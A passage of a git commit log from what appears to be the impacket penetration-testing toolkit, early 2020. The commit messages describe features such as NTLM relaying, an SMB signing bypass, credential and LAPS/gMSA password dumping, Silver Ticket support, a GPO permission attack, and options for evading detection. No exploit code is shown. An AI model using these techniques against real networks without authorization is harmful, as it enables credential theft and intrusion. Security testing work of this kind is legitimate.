Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Mar 8 01:58:32 2020 +0300

    fix byte-string concatenation bug in ntlmrelayx.py

commit dbbfc78ce484ccda1100a47c1bd20a6a82613839
Author: Mario Vilas <mvilas@gmail.com>
Date:   Sat Mar 7 17:37:40 2020 +0100

    Fixed crash on Wine when Git was not installed
    
    wine 'C:\Python27\python.exe' setup.py install
    Traceback (most recent call last):
      File "setup.py", line 17, in <module>
        if call(["git", "branch"], stderr=STDOUT, stdout=open(os.devnull, 'w')) == 0:
      File "C:\Python27\lib\subprocess.py", line 172, in call
        return Popen(*popenargs, **kwargs).wait()
      File "C:\Python27\lib\subprocess.py", line 394, in __init__
        errread, errwrite)
      File "C:\Python27\lib\subprocess.py", line 644, in _execute_child
        startupinfo)
    WindowsError: [Error 2] File not found

commit e0c1b9dd27be01a170eb3a95b46dc20e2da28f16
Merge: 62d59d65 141c675c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 5 18:03:36 2020 -0300

    Merge pull request #704 from MrAnde7son/patch-13
    
    Fix messageId bug in ldap search request

commit 62d59d656a646ab2c9a3e466cdb64f08b0eacf85
Merge: eae8757f a26f2ca1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 5 10:41:05 2020 -0300

    Merge pull request #783 from 0xdeaddood/NTLMhash_history
    
    Fix NTLM hash history dumping in secretsdump.py

commit a26f2ca13b8c2ae6d9afb03c120f6c92ccb1bb23
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 5 10:09:57 2020 -0300

    * Remove duplicated line
    * Unify hash history structure

commit 1219896f14056cc229632a39e9ceea2846833e22
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 4 14:41:42 2020 -0300

    Fix NTLM hash history dumping in secretsdump.py
    Fix local hash history dumping from Windows Server 2016 and 2019

commit eae8757f7941cce7f8c04ea28c31d8fa2c449ac8
Merge: afe746d2 f6a45b4b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 2 10:16:13 2020 -0300

    Merge pull request #770 from cube0x0/master
    
    Added Support for Dumping gMSA Password

commit afe746d2e2fe90e6eade333e4062caad1b83258b
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 15:37:00 2020 -0300

    Adding keytab support to secretsdump and remote exec scripts
    
    - Added a loadKeysFromKeytab() class method into keytab.py for easier usage from the scripts.

commit 50412c7ff7a4217e454ad0c73641481682838a02
Merge: 05507f0d eb144a21
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 14:58:36 2020 -0300

    Merge branch 'kcirtapw-unixsilverticket'

commit eb144a2197180a82daa434ab6c3e78e9114bd9f8
Merge: 05507f0d 94f5f299
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 14:50:05 2020 -0300

    Merge branch 'unixsilverticket' of https://github.com/kcirtapw/impacket into kcirtapw-unixsilverticket

commit 05507f0d651051981544c974785509f484eecefd
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 14:40:01 2020 -0300

    Added a few test cases from previous PR merge

commit caad03d9c47487236ce42b30cb80535830666ef8
Merge: 03cbe6e8 ba8fcb34
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 14:35:49 2020 -0300

    Merge branch 'spinenkoia-master'

commit 94f5f299ec6e488e959d5d783aca15852f4012e5
Author: Patrick Welzel <git@kcirtap.de>
Date:   Mon Feb 24 01:02:50 2020 +0100

    Keytab: fix parsing when entries have rest.
    
    Reworked size and KVNO/kn8 logic. Implemented handling of deleted entries.

commit e3032a5149faba4312142cffc6f40a2932cb0b18
Author: Patrick Welzel <git@kcirtap.de>
Date:   Sun Feb 23 23:07:07 2020 +0100

    add option to examples/ticketer.py to read key directly from a UNIX Keytab
    
    Parses Keytab file and extracts matching key for SPN automatically.
    This makes Silver Ticket attacks on unix more convenient. ;)

commit 0abe1c92876052f70d0a30b715fd37744f615914
Author: Patrick Welzel <git@kcirtap.de>
Date:   Sun Feb 23 23:05:24 2020 +0100

    add getKey search method to Keytab objects
    
    Make keytabs searchable, including a preferenced list for automatic encryption type selection.
    Also improve KeyBlock usage from the outside

commit 4cbc658a61d76a4a03307015fee39e6e8c9b5d3f
Author: Patrick Welzel <git@kcirtap.de>
Date:   Sun Feb 23 21:11:44 2020 +0100

    ensure py2 compatibility
    
    Don't stop here, this is python2.7 land! /o\

commit fbe1ddc0b5b7f0223c55a865bd71e157d419d3d8
Author: Patrick Welzel <git@kcirtap.de>
Date:   Sun Feb 23 20:11:27 2020 +0100

    add implementation for keytab files
    
    Keytab files are used on UNIX to store principals long-term-keys on client systems.
    This implementation is oriented on impacket.krb5.ccache and based on https://repo.or.cz/w/krb5dissect.git/blob_plain/HEAD:/keytab.txt
    It should help run successfull SilferTicket attacks against UNIX based targets.

commit f6a45b4b9a64fd88db8cc828f3a375613792122c
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 23:25:00 2020 +0100

    Add files via upload

commit 1257e0c3d78e938751b1d50b1f1f36226d7a35c7
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 13:24:15 2020 -0900

    fk up

commit 43467061d389ea9e8a64d79fdba84b37cfc3cbe0
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 23:22:53 2020 +0100

    Add files via upload

commit bb1a35150bf9acfdbd1642511aa192e7e4f5f7e7
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 23:19:34 2020 +0100

    changed to john output

commit bb9ca16e3b97fb2fb51f937367e66bf8c020b02d
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 22:50:43 2020 +0100

    Add files via upload

commit ba8fcb34233fde50ba2fe4be92c8436596ce5d7d
Author: Спиненко Иван ispinenko@ussc.ru <ispinenko@ussc.ru>
Date:   Fri Feb 21 17:17:50 2020 +0500

    Added helper from method 3.1.4.19 ElfrOldestRecord (Opnum 5).

commit 03cbe6e86424b45fa0e0e6c0a0c9326ab71ec656
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 20 18:13:30 2020 -0300

    Removing

commit adc3905fac8856449baaaf623fe199796e0211b5
Merge: b91d2e3d 6bc0d526
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 20 18:11:10 2020 -0300

    Merge branch 'Zer1t0-ticket_converter'

commit 6bc0d5262ac29192a337c12eca5d048df8e79032
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 20 18:09:39 2020 -0300

    Renaming example + adding version banner

commit 7fe8aaab1dd96208bce73765b270e00230e38f09
Merge: b91d2e3d c2a92c53
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 20 18:05:04 2020 -0300

    Merge branch 'ticket_converter' of https://github.com/Zer1t0/impacket into Zer1t0-ticket_converter

commit b91d2e3d4c5bd949d43f2ceee7112ae2a7a66a83
Merge: d757c3a4 a45e4a65
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Feb 20 11:00:39 2020 -0300

    Merge pull request #712 from cnotin/patch-1
    
    nmb.py: stop using select() in non_polling_read()

commit d757c3a402e59c9c6e01d6a457a10af4dec836f3
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 19 16:46:20 2020 -0300

    Do not allow default values to persist based on itemValue
    
    - This should address https://github.com/SecureAuthCorp/impacket/issues/768, although testing is needed.
    - I'm concerned this could break https://github.com/SecureAuthCorp/impacket/pull/646. Please @stuken can you verify?
    - Down the road we should parse the NdTable that defines better rules on whether to follow the default value or not. (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmio/65bcd0c2-b3f3-49a7-b4aa-c972cdc0774b)

commit f4947f0c0dcf5f8bc1ed3af012831cf7b9bcac37
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 19 13:52:44 2020 -0300

    Removing forgotten debug messages :)

commit 2aa01011dc875a15aaec6e535a87e1c8a1d6032b
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 19 13:48:06 2020 -0300

    Adding port to Python3 on MSSQL Authentication use case and some column types.
    
    - Not sure whether it covers all the TDS columns, testing's needed.

commit a2370adc9b74fcf3cee60aab1caf17103c04cc60
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Mon Feb 17 11:15:04 2020 -0900

    Add files via upload

commit e5e676d7db3ac6fe19212184b1fa61554c2d04ac
Merge: 5259ed0f 1fdaac63
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 17 16:34:37 2020 -0300

    Merge pull request #771 from 0xdeaddood/dump_unicode
    
    Add unicode support for Python 2.x and 3.x to secretsdump

commit 1fdaac63cf6fffb1119c5a891aca1737faceca07
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Feb 17 14:53:07 2020 -0300

    Add unicode support for Python 2.x and 3.x to secretsdump.

commit baf7dba42b20bdc844ff04b876ee76b477ce5169
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Mon Feb 17 10:34:32 2020 -0500

    Add files via upload

commit 265caa4fb8e321dfb06ea6c19aec6112f4d7dece
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Mon Feb 17 10:33:43 2020 -0500

    Add files via upload

commit 2c88da85b1dbd70f7e21001506237bc8ac80e972
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Mon Feb 17 10:32:57 2020 -0500

    Add files via upload

commit 5259ed0f30f03658d1d4fd1f6a6ed5821847852d
Merge: 70c38fbe d14a7c5c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Feb 14 11:16:03 2020 -0300

    Merge pull request #766 from justin-p/fix-delegate-access
    
    Fix addComputer when using the delegate access flag

commit fe305dbfdcf1ed89ff0dc47a2acda155f16d18b8
Author: Tom Wyatt <tom@imakethin.gs>
Date:   Wed Feb 12 14:53:48 2020 +0000

    Added GPO writedacl attack to ldapshell
    
    Added a write_gpo_dacl command to the ldapshell. Takes a SamAccountName
    and GPO guid (with surrounding {}) and adds a "Full Access" ACE to the
    DACL

commit 70c38fbec76c483985349bba547ca24a2bd3eea7
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 11 10:10:47 2020 -0300

    Clarifying new target selection criteria

commit a0aca12c29d5ce80373ea6b83f9d774089b226bb
Merge: 410fee74 0aa4f769
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 10 17:27:51 2020 -0300

    Merge pull request #767 from 0xdeaddood/relay-user-multi
    
    Support for multiple relays through one SMB connection in ntlmrelayx.py

commit 0aa4f769ac378ba6ae29c1c9397d71a38d7d01fe
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Feb 10 11:00:37 2020 -0300

    Fix some issues in the target processor

commit d9cd556454fa267b9ccdf2f0512cf71adc4ac664
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 6 15:13:20 2020 -0300

    Add some changes related to PY3 compatibility

commit 4dd4921ce581a376e198edb0a3197c3babf6993e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 6 00:27:43 2020 -0300

    Adding changes to support CVE-2019-1019 "Bypass SMB singing for unpatched machines" in SMBv1

commit 71fd1e27249d332fff19386e672f2fb6ea7c95af
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 6 00:19:56 2020 -0300

    Adding changes to support CVE-2019-1019 "Bypass SMB singing for unpatched machines" in SMBv2

commit 95c214394176111cff9d198d8bcbbed0ef64792f
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 29 20:31:16 2019 -0300

    Support for targets with users specified and multiple relays using same connection
    
    * This add SMBv1 support (SMBv2 in previous commit)

commit 955e88747fce6b125c075ffe993de6b6e6ee6ee1
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 29 12:52:19 2019 -0300

    Support for targets with users specified and multiple relays using same connection
    
    1. You can know specify targets with usernames (e.g. smb://Administrator@1.1.1.1 or smb://CONTOSO\Administrator@1.1.1.1 - be aware of the backslash) and the SMBRelayServer (hopefully the HTTP server soon) will verify the user that connected to us before attempting to relay to a target.
    The approach we're using is always authenticate the user locally (against our SMB Server) and then, right after the first iteraction the client does (will always be a TreeConnect) we decide where to relay (or not) and force the client to authenticate again (using STATUS_NETWORK_SESSION_EXPIRED).
    
    2. Since we can use the client as an oracle for NTLM Auth (by means of STATUS_NETWORK_SESSION_EXPIRED), the process will continue until all targets for the connected user are exhausted, meaning there will be many relays happening from a single connection.

commit 032a19391185485afc7040620c4c040ece401e47
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 29 12:50:12 2019 -0300

    Getting rid of SPNEGO for NTLM Relay
    
    1) We don't actually need it (mostly sure, testing needed), and will help in some scenarios where mechListMIC is requested (and we don't have it).

commit 95f95915e54cc743c78d8683b14f9a3e39b3c0c7
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 29 12:35:34 2019 -0300

    TargetsProcessor changes
    
    1) The --randomize option is applied in the constructor (using random.shuffle)
    2) We have two candidates now: namedCandidates (targets with identity specified) and generalCandidates (just targets w/o identity). I'm not convinced of the names tho (might change). The reason is to differentiate them when calling getTarget()
    3) getTarget() reworked. You can specify the identity you already captured so we can better chose the target. The logic now should be:
       a. If identity is specified, it will first search int the namedCandidates for a fit
       b. If no fit is found, then it will iterate over the generalCandidates list, but, if an identity was specified, it will check it hasn't been relayed successfully already, avoiding unnecesary work. If no identity was specified, it'll pick the first one on that list.
       c. If there's no fit at all in some of the steps, this method can NOW return None, and the caller should act accordingly.
       d. ToDo: We should have another list of failed attempts (with user) and check that inside this method so we do not retry those targets.
    4) Comments are allowed in target files (lines starting with '#')
    
    Didn't test if the file watcher keeps working tho.

commit 410fee7481f4f96be6aa753bcaf8655233d8762d
Merge: 34afbfc5 c0b4f075
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 10 13:54:16 2020 -0300

    Merge pull request #758 from praetorian-adam-crosser/master
    
    Added LAPS Dumping Support

commit 34afbfc50ae41db4098122f663a6f247b0b8f279
Merge: 8d4c9148 b938f422
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 10 10:29:36 2020 -0300

    Merge pull request #765 from justin-p/non-interactive-ldap-fix
    
    fix non-interactive LDAP

commit d14a7c5c2630ff56a2bb4131c0346547934f88ed
Author: Justin Perdok <justin-p@users.noreply.github.com>
Date:   Sun Feb 9 21:22:36 2020 +0100

    Update ldapattack.py

commit b938f422e0747cf6d879861c5c2d0941b6b3ad02
Author: Justin Perdok <justin-p@users.noreply.github.com>
Date:   Sun Feb 9 15:14:50 2020 +0100

    fix non-interactive LDAP

commit c0b4f0751408e42d0635312cc6d8a52054af190d
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Thu Feb 6 18:10:30 2020 -0600

    Updated Debug Messages and Fixed Early Exit Issue

commit 8d4c91481b01dae9f62804893fcc74a40ffc7c45
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 5 19:52:39 2020 -0300

    Print Library's installation path by default when -debug is specified

commit 326e4bd8aa133f27f09f132d6934547cdd320494
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 5 17:51:54 2020 -0300

    Adjusting year and adding getInstallationPath()
    
    - To be used soon in the examples

commit 3c09a2baf503f6a062b6c4a56e9523f62668dd8e
Merge: d4c79287 b4362ee0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Feb 5 17:21:01 2020 -0300

    Merge pull request #761 from jsherwood0/master
    
    Single-source the version and standardize

commit d4c792872ecff98f27e27d017c0f02713c7a8b91
Merge: 13cfc72a 13885535
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Feb 5 14:26:25 2020 -0300

    Merge pull request #762 from mohemiv/master
    
    Improving dcomexec.py/atexec.py

commit 13885535d713f6a93cbd458bd189070b6532d08b
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Wed Feb 5 06:37:41 2020 +0300

    Added encoding support for dcomexec.py/atexec.py and some improvements for atexec.py

commit b4362ee0acbf0f9b76e8e2d92f2c644d13c0ab09
Author: root <root@vmkalirolling.patchadvisor.com>
Date:   Tue Feb 4 18:56:34 2020 -0500

    Add git short hash for the commit to version

commit c33bed05f523d114d3eb9db1de9b317dc7a4dc82
Author: root <root@vmkalirolling.patchadvisor.com>
Date:   Mon Feb 3 17:12:40 2020 -0500

    Single-source the version and standardize
    
    - Scheme now uses semantic+pre-release+local versioning
      ( see https://bit.ly/36QdfJX )
    - Version now pulls date timestamp from last commit if in a git dir
    - Banner now pulls version directly from setup.py version
    - Eliminates case where multiple different version all display the
      same version number in the banner

commit 13cfc72ac9b0ff255afdd99ebc558e6fad2b1e57
Merge: a1a8d470 9e58e1f3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 3 11:08:52 2020 -0300

    Merge pull request #747 from mlefebvre/ldap_shell
    
    Added LDAP interactive mode to ntlmrelayx.

commit a1a8d470319c73eba729d9b51969e94d7621c4e2
Merge: 55dd623f a80e710c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jan 30 17:48:21 2020 -0300

    Merge pull request #746 from mlefebvre/fix_python3_interactive
    
    Fixed UnsupportedOperation('not writable') when using interactive shell with Python 3.

commit 55dd623f646453e4913355f9b09cc8f8d4fd2bbe
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 30 15:15:43 2020 -0300

    Fixing PGUID_ARRAY pointing to the right structure
    
    Fixes https://github.com/SecureAuthCorp/impacket/issues/729

commit 5f51d2884021a96161485c9d7a1ce4b6bd141a1a
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Wed Jan 29 13:17:08 2020 -0600

    LAPS Dumping Support

commit 1df2ec3674d17514e9262bf9869741a83d5b6285
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Wed Jan 29 12:51:09 2020 -0600

    LAPS Dumping Support

commit 4a5403c3c15875a281a69f95f5fe02edcf6969e6
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 29 11:34:59 2020 -0300

    Changing LDAP3 version requirements
    
    - Matching ldapdomaindump requirements
    - Should address https://github.com/SecureAuthCorp/impacket/issues/742

commit f5156b1f45ac74d42d7337583605ecd3b6d7f722
Merge: 2aefcc5e 4661adb0
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 27 15:21:37 2020 -0300

    Merge branch 'rmaksimov-smb1_dialect_fix'

commit 4661adb094b30e8d709d44e9556d3879a1c4b911
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 27 15:21:18 2020 -0300

    Removed commented lines

commit 9ce62d7f711bf12cc1c2cce6219f2a82e102142b
Merge: 2aefcc5e d49cc05d
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 27 15:20:13 2020 -0300

    Merge branch 'smb1_dialect_fix' of https://github.com/rmaksimov/impacket into rmaksimov-smb1_dialect_fix

commit 2aefcc5e01c12bc18aa7ab6612efe598d95fb682
Merge: 36126410 39b99c35
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 27 10:21:21 2020 -0300

    Merge pull request #750 from mohemiv/master
    
    Added two missing DCE/RPC calls in tsch.py

commit 361264100afb3d5068fa9a6c9716cbe6795ab64b
Merge: bf437b9c 71330818
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 21 13:21:55 2020 -0300

    Merge branch 'G0ldenGunSec-findDelegation'

commit 713308189cd225ebb6af2c966d0c0626ccbbe85d
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 21 13:20:52 2020 -0300

    Minor changes post merge
    
    - Fixed copyright year
    - Optimized imports
    - Fixed 3.8 warnings
    - Long lines no good for reading, breaking them.

commit 6a1fc6516e7c22a80732616f914a5f4ea2e4cb9b
Merge: 8df51ad2 30fa6825
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 21 13:14:50 2020 -0300

    Merge branch 'findDelegation' of https://github.com/G0ldenGunSec/impacket into G0ldenGunSec-findDelegation

commit 39b99c35f5885afe850f0c1f83ccc3398bb33c1d
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon Jan 20 01:12:15 2020 +0300

    Added missing opnum line for SchRpcEnableTask in tsch.py

commit bd85a5c66ee9ad5cf57adfb77df0a24eb47cedd2
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon Jan 20 00:56:37 2020 +0300

    Added two missing DCE/RPC calls in tsch.py

commit d49cc05d450d01d3f820dd96d710da8f935c6551
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Thu Jan 16 23:59:40 2020 +0300

    fix connection issue in smbexec.py and samrdump.py

commit 30fa682554640111cb67d27174d812bb5e793ff6
Author: G0ldenGunSec <28241763+G0ldenGunSec@users.noreply.github.com>
Date:   Wed Jan 15 14:57:39 2020 -0600

    findDelegation.py
    
    Simple script to quickly list all delegation relationships (unconstrained, constrained, resource-based constrained) in an AD environment.

commit 9e58e1f35c1c6125c601afe352f24d2b784ecbe5
Author: Mathieu Gascon-Lefebvre <mathieuglefebvre@gmail.com>
Date:   Wed Jan 15 12:55:13 2020 -0500

    Fixed flake8 error. reload doesn't exist in python 3.

commit c43e378d5ae6139a437587cd15ea1e99b77ab755
Author: Mathieu Gascon-Lefebvre <mathieuglefebvre@gmail.com>
Date:   Wed Jan 15 12:20:01 2020 -0500

    Updated ntlmrelayx.py help.

commit 5f238c5b8f95daada58e33c307e27504708879f8
Author: Mathieu Gascon-Lefebvre <mathieuglefebvre@gmail.com>
Date:   Wed Jan 15 11:57:04 2020 -0500

    Added an interactive shell to perform LDAP operations.

commit a80e710c5d84444837b06334059fe5d960c19cdb
Author: Mathieu Gascon-Lefebvre <mathieuglefebvre@gmail.com>
Date:   Wed Jan 15 10:44:16 2020 -0500

    Fixed python 3 interactive shell.

commit bf437b9c0a489a17e199cdc8899a89914c1c3113
Merge: 2b7faf76 416f1893
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 13 14:19:14 2020 -0300

    Merge pull request #721 from G0ldenGunSec/master
    
    Add delegation information to GetUserSPNs.py

commit 2b7faf763bd9b61fc1ae8a681e86448b0bd33869
Merge: 8df51ad2 d3489099
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 13 14:18:03 2020 -0300

    Merge pull request #745 from 0xe7/delegate-to-sid
    
    Added support for supplying the sid as the escalate user for delegati…

commit d3489099a80a1ccb0f559abf04dc7f6facd265d3
Author: 0xe7 <charlie@exploit.ph>
Date:   Sun Jan 12 15:03:26 2020 +0000

    Added support for supplying the sid as the escalate user for delegation attacks

commit 8df51ad2a13017998bb01ac7f4c53f05449d99f4
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 10 10:54:07 2020 -0300

    Python3 support for serve_wpad() method
    
    * Should partially address https://github.com/SecureAuthCorp/impacket/issues/744

commit 141e00dccdcc31fc4cab2ec6fae0e9bce2ad2934
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 10 10:53:12 2020 -0300

    Setting a default value for wpad-auth-num (default:1)
    
    * Should partially address https://github.com/SecureAuthCorp/impacket/issues/744

commit 1f927fd0d1917a1d5fc50753bc8b04521fc11d83
Merge: f1db74d5 495ae0ea
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 9 14:33:54 2020 -0300

    Merge branch 'BarakSilverfort-nrpc-unicode-errors'

commit 495ae0ea1b5801fd57f22e982cb829739b9ba353
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 9 14:33:23 2020 -0300

    Porting getSSPType1() to Python3

commit 78048b7ba598d454478d3753887016f783df6c62
Merge: f1db74d5 65f10dde
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 9 14:24:34 2020 -0300

    Merge branch 'nrpc-unicode-errors' of https://github.com/BarakSilverfort/impacket into BarakSilverfort-nrpc-unicode-errors

commit 416f1893c93f3a067a02f901f3cd5ee2d6968629
Author: G0ldenGunSec <28241763+G0ldenGunSec@users.noreply.github.com>
Date:   Wed Jan 8 20:53:34 2020 -0600

    fixed python 3 issues
    
    tabs to spaces

commit 65f10ddefe863c422810a8cb3c313a697c259c99
Author: Barak Hirsch <barak@silverfort.com>
Date:   Wed Jan 8 15:11:26 2020 +0200

    Fix nrpc to work for python 3

commit f1db74d5e851c4cef38494c7e92a152f70fb9d46
Merge: fb723db3 96b4fc47
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 7 21:35:48 2020 -0300

    Merge pull request #737 from GoSecure/fix_736
    
    Fixed the missing python 2 to python 3 conversions in rrp.py

commit fb723db3c0062bbeb79025412b66f287ccce3e66
Merge: c0e59d2f e2fe6938
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 7 16:47:48 2020 -0300

    Merge pull request #728 from GoSecure/more_flags
    
    Added flags to SMBExec and PSExec to bypass badly made detection use cases

commit c0e59d2fcf01b52a1f66ed72bef6f2c1d3eb6530
Merge: 0502d596 fff7bc36
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 6 15:44:00 2020 -0300

    Merge pull request #725 from 0xdeaddood/raiseChild_RID
    
    RaiseChild RID feature

commit 0502d5960649d39bebd87e2c67de72f98403e0ff
Merge: bdf2e3d9 3b41d48e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 6 15:43:13 2020 -0300

    Merge pull request #727 from 0xdeaddood/timestamp
    
    Add the timestamp option to several scripts

commit bdf2e3d9d73858aa15db43c50fba7d3bb310c9eb
Merge: 6f1ac647 e32f6e3e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Jan 3 14:50:00 2020 -0300

    Merge pull request #739 from imaibou/imaibou-dpapi-rpc
    
    dpapi.py Add RPC masterkey decryption

commit 6f1ac64762f02ac4472e191c9a2ff8cc3c876bbd
Merge: f2546a0b 3bd51972
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Jan 3 14:47:37 2020 -0300

    Merge pull request #738 from imaibou/imaibou-dpapi-pth
    
    dpapi.py add Pass the hash

commit e32f6e3e7572a800c2cbd70fc316582260accd63
Author: imaibou <ai_bounab@esi.dz>
Date:   Fri Jan 3 16:40:31 2020 +0100

    dpapi.py Add RPC masterkey decryption
    
    Added feature to decrypt a user's masterkey using the MS-BKRP (BackupKey Remote Protocol). This is already implemented in mimikatz to decrypt masterkeys using the /rpc flag (https://github.com/gentilkiwi/mimikatz/blob/172200295688ccbb76c44c6db0b3b47d39dd0d4d/modules/rpc/kull_m_rpc_bkrp.c#L51-L54)
    This makes an RPC call with the user's identity to the function BackuprKey on the DC. The GUID of this operation is BACKUPKEY_RESTORE_GUID and the details can be found on microsoft documentation here: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/7accb903-3863-4385-9c99-11af8c18d656

commit 3bd51972cd8de6be933e50509e6c33c396e1bcc8
Author: imaibou <ai_bounab@esi.dz>
Date:   Fri Jan 3 15:39:09 2020 +0100

    dpapi.py add Pass the hash
    
    Added pass the hash support for backup key retrieval

commit 96b4fc476862c1ed8252ff8c35880b6bd4bcf0bc
Author: Maxime Nadeau <maxime.nadeau@outlook.com>
Date:   Thu Jan 2 11:25:25 2020 -0500

    Fixed the missing python 2 to python 3 conversions

commit e2fe6938dc9bc1f4f1b663fd8bb7c1f2286091cf
Author: Maxime Nadeau <maxime.nadeau@outlook.com>
Date:   Thu Dec 19 13:16:09 2019 -0500

    Possibility to rename the PSExec uploaded binary name to avoid entropy-based detection use cases

commit 906724ae566d4f918e375c9f57162c60dd29ecce
Author: Maxime Nadeau <maxime.nadeau@outlook.com>
Date:   Thu Dec 19 13:01:25 2019 -0500

    Added the -service-name flag to SMBExec to avoid BTOBTO-based detection use cases

commit 3b41d48e075fa011194e79cdba7287d4b83130d2
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Dec 18 11:34:56 2019 -0300

    Add the timestamp option to several scripts
    - GetADUsers.py, GETNPUsers.py, getST.py, getTGT.py, goldenPac.py, secretsdump.py, ticketer.py

commit 97d2336d81f16e7c2cffaba8671dbfaa5eee4d36
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Dec 18 09:13:27 2019 -0300

    Add the timestamp option to several scripts
    - lookupsid.py, netview.py, ntlmrelayx.py, raiseChild.py, samrdump.py, smbrelayx.py

commit 0f6713f8918eacc2a66db057af5455936892e36b
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Dec 18 08:17:41 2019 -0300

    Add the timestamp option to the remote execution scripts

commit f2546a0bc54e9df11b3a7f225af069125218d359
Merge: c5183d42 a7365092
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 17 11:58:43 2019 -0300

    Merge pull request #723 from fox-it/strict_validation
    
    Add option for strict NTLM hostname validation in SMB transports

commit fff7bc368f5f4bcd8d93e16bcc807f6acdda968e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Dec 16 11:45:00 2019 -0300

    Modify help message

commit a32f917d73c67a0417e51ec6d45334707829fb91
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Dec 16 10:17:40 2019 -0300

    Change parameter name and add exception handling (wrong RID)

commit e9c3022766eda7eb7509c9431edaa93ddf4561da
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Dec 13 18:42:36 2019 -0300

    raiseChild: added new parameter to specify the RID of a user to dump credentials and, if target is specified, launch a PSEXEC shell

commit a736509259c9d78c382c2ad6d2e3b9f1c55b3b09
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Dec 11 16:02:59 2019 +0100

    Add option for strict NTLM hostname validation in SMB transports

commit c5183d42b6cc0b05631612d350283a298f8159b2
Merge: 909238e9 1f2d203f
